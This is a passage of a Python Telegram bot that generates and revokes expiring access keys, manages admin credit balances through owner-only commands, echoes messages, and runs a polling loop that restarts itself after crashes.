    prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
    generated_keys = []
    for _ in range(num_keys):
        suffix = uuid.uuid4().hex[:6].upper()
        new_key = prefix + suffix
        keys[new_key] = {
            "expires_at": expiration.isoformat(),
            "max_users": 1,
            "max_duration": max_duration,
            "used": [],
            "generated_by": admin_id
        }
        generated_keys.append(new_key)
    save_keys_data()
    reply = "<b>✅ Keys generated:</b>\n"
    for k in generated_keys:
        reply += f"<code>{k}</code>\n"
    reply += f"<b>Expires at:</b> {expiration}\n"
    reply += f"<b>Max Duration:</b> {max_duration} sec"
    safe_reply(message, reply)

def admin_revoke_key(message):
    parts = message.text.split()
    if len(parts) != 2 or parts[0].lower() != "revoke":
        safe_reply(message, "<b>❌ Incorrect format.</b> Send: revoke KEY_VALUE")
        return
    key_to_revoke = parts[1].strip()
    if key_to_revoke in keys:
        del keys[key_to_revoke]
        save_keys_data()
        safe_reply(message, f"<b>✅ Key {key_to_revoke} revoked!</b>")
    else:
        safe_reply(message, "<b>❌ Key not found.</b>")

@bot.message_handler(commands=['checkcredits'])
@safe_handler
def check_credits_handler(message):
    admin_id = message.from_user.id
    balance = get_credit_balance(admin_id)
    history = get_credit_history(admin_id)
    history_text = "\n".join([f"{item['timestamp']}: {item['type']} {item['amount']} ({item.get('reason','')})" for item in history])
    reply = (f"<b>💳 Your Credit Balance:</b> {balance}\n"
             f"<b>📝 Transaction History:</b>\n<pre>{history_text}</pre>")
    safe_reply(message, reply)

@bot.message_handler(commands=['addcredit'])
@safe_handler
def add_credit_command(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to add credits!</b>")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_reply(message, "<b>❓ Usage:</b> /addcredit <admin_id> <amount>")
        return
    target_id = command_parts[1]
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_reply(message, "<b>❌ Error:</b> Amount must be an integer.")
        return
    add_credit(target_id, amount, reason="Manual credit addition")
    safe_reply(message, f"<b>✅ Added {amount} credits to admin {target_id}.</b> New balance: {get_credit_balance(target_id)}")

@bot.message_handler(commands=['addadmin'])
@safe_handler
def add_admin_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to add admin!</b>")
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) not in [2, 3]:
            safe_reply(message, "<b>❓ Usage:</b> /addadmin <admin_id> [initial_credit]")
            return

        target_admin = command_parts[1]
        try:
            admin_id = int(target_admin)
        except ValueError:
            safe_reply(message, "<b>❌ Admin ID must be an integer.</b>")
            return

        initial_credit = 1000  # default initial credit
        if len(command_parts) == 3:
            try:
                initial_credit = int(command_parts[2])
            except ValueError:
                safe_reply(message, "<b>❌ Initial credit must be an integer.</b>")
                return

        if str(admin_id) in admin_credits:
            safe_reply(message, f"<b>ℹ️ Admin {admin_id} already exists with {admin_credits[str(admin_id)]['balance']} credits.</b>")
            return

        admin_credits[str(admin_id)] = {
            "balance": initial_credit,
            "history": [{
                "type": "add",
                "amount": initial_credit,
                "reason": "Admin addition",
                "timestamp": datetime.now().isoformat()
            }]
        }
        try:
            save_admin_credits_data()
        except Exception as e:
            safe_reply(message, "<b>❌ Failed to save admin data. Please try again later.</b>")
            log_execution(f"Error saving admin credits in /addadmin: {e}")
            return

        safe_reply(message, f"<b>✅ Admin {admin_id} added with {initial_credit} credits.</b>")
    except Exception as e:
        safe_reply(message, f"<b>❌ Unexpected error in /addadmin:</b> {str(e)}")
        log_execution(f"Unexpected error in add_admin_handler: {traceback.format_exc()}")

@bot.message_handler(commands=['removeadmin'])
@safe_handler
def remove_admin_handler(message):
    if not is_owner(message):
        safe_reply(message, "<b>🚫 Not authorized to remove admin!</b>")
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            safe_reply(message, "<b>❓ Usage:</b> /removeadmin <admin_id>")
            return

        target_admin = command_parts[1]
        try:
            admin_id = int(target_admin)
        except ValueError:
            safe_reply(message, "<b>❌ Admin ID must be an integer.</b>")
            return

        if str(admin_id) not in admin_credits:
            safe_reply(message, f"<b>❌ Admin {admin_id} not found.</b>")
            return

        try:
            del admin_credits[str(admin_id)]
            save_admin_credits_data()
        except Exception as e:
            safe_reply(message, "<b>❌ Failed to remove admin data. Please try again later.</b>")
            log_execution(f"Error saving admin credits in /removeadmin: {e}")
            return

        safe_reply(message, f"<b>✅ Admin {admin_id} removed.</b>")
    except Exception as e:
        safe_reply(message, f"<b>❌ Unexpected error in /removeadmin:</b> {str(e)}")
        log_execution(f"Unexpected error in remove_admin_handler: {traceback.format_exc()}")

@bot.message_handler(func=lambda message: True)
@safe_handler
def echo_all(message):
    if message.from_user.id in blocked_users:
        return
    safe_reply(message, f"<b>{message.text}</b> 🤖")

# ---------------------------
# Main Bot Loop with Watchdog
# ---------------------------
if __name__ == '__main__':
    periodic_thread = threading.Thread(target=print_periodically, daemon=True)
    periodic_thread.start()

    while True:
        try:
            print("🤖 Bot is running...")
            bot.polling(none_stop=True)
        except Exception as e:
            log_execution(f"❌ Bot crashed: {str(e)}")
            print("❌ Bot crashed, restarting in 5 seconds:", e)
            time.sleep(5)
